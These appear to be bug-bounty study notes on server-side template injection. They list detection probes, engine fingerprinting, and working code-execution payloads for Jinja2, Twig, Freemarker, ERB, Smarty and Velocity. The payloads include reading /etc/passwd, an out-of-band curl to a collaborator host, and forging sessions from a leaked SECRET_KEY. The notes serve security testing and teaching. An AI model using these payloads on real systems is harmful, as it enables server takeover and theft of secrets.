# Ch16: Template Injection

Source: Chapter 16. SSTI = user input lands inside a server-side *template*, evaluated by the template engine (Jinja2, Twig, Freemarker, ERB, Velocity, Smarty…) — not merely rendered as data. Distinction that matters: `{{7*7}}` reflected as `49` = SSTI; reflected literally = harmless template echo / possible CSTI (client-side, AngularJS `{{7*7}}`).

## Hunting

1. **Detection payloads**: `{{7*7}}` (Jinja2/Twig), `${7*7}` (Freemarker/Velocity/EL), `<%= 7*7 %>` (ERB/EJS), `#{7*7}`, `*{7*7}` (Thymeleaf). Feed into every reflected/stored field — profile names, email templates, PDF generators, CMS pages, error messages, notification subjects.
2. **Fingerprint the engine** from errors and syntax responses — then pick the engine's RCE idiom:
   - **Jinja2**: `{{config}}` leak → `{{''.__class__.__mro__[1].__subclasses__()}}` → find `subprocess.Popen`/`os` → `{{…('id',shell=True,stdout=-1).communicate()}}`. Shorter: `{{self.__init__.__globals__.__builtins__.open('/etc/passwd').read()}}`.
   - **Twig**: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`.
   - **Freemarker**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
   - **ERB**: `<%= system('id') %>` / `<%= `id` %>`.
   - **Smarty**: `{system('id')}` / `{php}…{/php}` old versions.
   - **Velocity**: `#set($e="e")$e.getClass().forName("java.lang.Runtime")…`.
3. **Blind SSTI**: OOB confirm (`…Popen('curl COLLAB/x')…`) or timing (`{{sleep(5)}}` where available).

## Escalation & bypasses

- Output filter strips tags → expression injection (`${...}`, `#{...}` alternates), string concat bypasses, `request.`/`g.`/`self.` object walks around blocked names.
- Escalate: read config (`config.items()` in Flask/Jinja → `SECRET_KEY` → session forgery), env vars, then command exec → shell on test infra.
- CSTI (client-side): AngularJS sandbox escapes in `{{}}` — lower impact (≈XSS) but worth flagging.

## First-bug checklist

Fuzz fields with `{{7*7}}`-family → math evaluates → fingerprint engine → escalate config→RCE with engine idiom → blind? OOB curl → report template context + payload.
